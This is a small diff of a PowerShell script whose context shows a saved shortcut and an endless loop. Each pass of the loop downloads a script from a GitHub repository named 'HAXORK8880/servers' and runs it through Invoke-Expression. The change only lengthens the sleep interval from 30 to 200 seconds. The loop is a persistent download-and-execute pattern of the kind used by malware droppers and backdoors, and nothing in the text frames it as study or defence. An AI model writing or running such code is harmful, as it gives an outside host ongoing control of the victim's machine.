@@ -6,6 +6,6 @@ $Shortcut.Save()
 
 # Loop to run PowerShell script every 30 seconds
 while ($true) {
-    Start-Sleep -Seconds 30
+    Start-Sleep -Seconds 200
     Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
 }
